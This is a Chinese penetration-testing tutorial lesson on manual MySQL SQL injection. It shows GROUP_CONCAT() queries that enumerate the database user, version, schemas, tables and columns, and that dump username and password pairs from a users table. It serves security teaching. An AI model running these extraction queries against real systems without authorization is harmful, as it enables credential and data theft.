# 经典15年i春秋渗透测试系统化教程 - P15：课时7 注入式攻击-MySQL手工高级注入（下）🔍

![](img/7f9395bee61f928a600e05f80e75e9c9_1.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_3.png)

在本节课中，我们将要学习MySQL手工注入中的高效查询技术，核心是掌握`GROUP_CONCAT()`函数的使用。通过这个函数，我们可以批量、快速地提取数据库、表、字段及其值，极大地提升信息收集的效率。

![](img/7f9395bee61f928a600e05f80e75e9c9_5.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_7.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_9.png)

上一节我们介绍了MySQL注入的基础方法，本节中我们来看看如何利用特定函数进行快速查询。

![](img/7f9395bee61f928a600e05f80e75e9c9_11.png)

## 高效查询的核心：`GROUP_CONCAT()`函数

![](img/7f9395bee61f928a600e05f80e75e9c9_13.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_14.png)

`GROUP_CONCAT()`函数是MySQL中一个强大的聚合函数。它的官方手册说明是：该函数返回一个字符串结果，该结果由分组中非NULL值的连接而成。

![](img/7f9395bee61f928a600e05f80e75e9c9_16.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_17.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_19.png)

用更通俗的语言来理解，它的作用是：**将属于同一组的多个行的值，连接成一个字符串并返回**。具体返回哪些列的值，由函数参数指定。

![](img/7f9395bee61f928a600e05f80e75e9c9_21.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_23.png)

其基本语法格式如下：
```sql
GROUP_CONCAT([DISTINCT] column_name [ORDER BY ...] [SEPARATOR '分隔符'])
```

![](img/7f9395bee61f928a600e05f80e75e9c9_24.png)

在渗透测试的注入过程中，这个函数能让我们用一条查询语句，就获取到原本需要多次查询才能得到的信息。

## 快速查询实战应用

以下是利用`GROUP_CONCAT()`函数进行高效查询的具体语句示例。

![](img/7f9395bee61f928a600e05f80e75e9c9_26.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_28.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_30.png)

### 查询基础信息

![](img/7f9395bee61f928a600e05f80e75e9c9_32.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_34.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_36.png)

通过以下语句，可以一次性查询当前数据库的用户、版本和数据库名。
```sql
SELECT GROUP_CONCAT(user(),0x7c7c7c,version(),0x7c7c7c,database())
```
在这条语句中，`0x7c7c7c`是竖线符号`|||`的十六进制表示，用作分隔符，方便我们在结果中区分出用户、版本和数据库名这三个部分。

![](img/7f9395bee61f928a600e05f80e75e9c9_38.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_40.png)

### 查询所有数据库名

![](img/7f9395bee61f928a600e05f80e75e9c9_42.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_44.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_46.png)

如果想查询当前MySQL实例中所有的数据库，可以使用以下语句。
```sql
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata
```
执行后，所有数据库的名称会以逗号分隔的形式一次性返回，非常方便。

![](img/7f9395bee61f928a600e05f80e75e9c9_48.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_50.png)

### 查询指定数据库的所有表名

![](img/7f9395bee61f928a600e05f80e75e9c9_51.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_53.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_54.png)

在得知数据库名后，我们可以进一步查询该数据库下所有的表。以下是查询语句。
```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
```
这条语句会返回当前数据库的所有表名。如果想查询其他数据库，只需将`database()`替换为指定的数据库名即可。

![](img/7f9395bee61f928a600e05f80e75e9c9_56.png)

### 查询指定表的所有字段名

![](img/7f9395bee61f928a600e05f80e75e9c9_58.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_60.png)

确定了目标表后，我们需要知道表中有哪些字段。以下是查询语句。
```sql
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=‘目标表名’
```
请将`‘目标表名’`替换为实际的十六进制或字符串形式的表名。

![](img/7f9395bee61f928a600e05f80e75e9c9_62.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_64.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_66.png)

### 查询字段内容（如账号密码）

![](img/7f9395bee61f928a600e05f80e75e9c9_68.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_70.png)

最后，也是最关键的一步，是提取表中的数据，例如用户表的账号和密码。以下是查询语句示例。
```sql
SELECT GROUP_CONCAT(username,0x7c,password) FROM users
```
这条语句会将`users`表中的`username`和`password`字段值用竖线连接后一并返回，实现数据的快速导出。

![](img/7f9395bee61f928a600e05f80e75e9c9_72.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_74.png)

## 总结

![](img/7f9395bee61f928a600e05f80e75e9c9_76.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_78.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_80.png)

本节课中我们一起学习了MySQL手工高级注入的下半部分，重点是掌握了`GROUP_CONCAT()`函数在高效查询中的应用。

![](img/7f9395bee61f928a600e05f80e75e9c9_82.png)

通过本课的学习，你应当了解：
1.  `GROUP_CONCAT()`函数的作用是将分组内的值连接成一个字符串。
2.  利用该函数，可以一次性快速查询数据库版本、用户、所有库名、表名、字段名及具体数据。
3.  在注入语句中使用十六进制分隔符（如`0x7c7c7c`）可以使返回结果更清晰易读。

![](img/7f9395bee61f928a600e05f80e75e9c9_84.png)

![](img/7f9395bee61f928a600e05f80e75e9c9_85.png)

这种方法比传统的逐条查询效率高得多，是手工注入中非常实用的技巧。在后续课程中，我们将借助工具进一步分析和学习更复杂的SQL注入语句。关于MySQL的手工注入部分就暂时告一段落，下一节我们将开始介绍其他类型数据库的注入。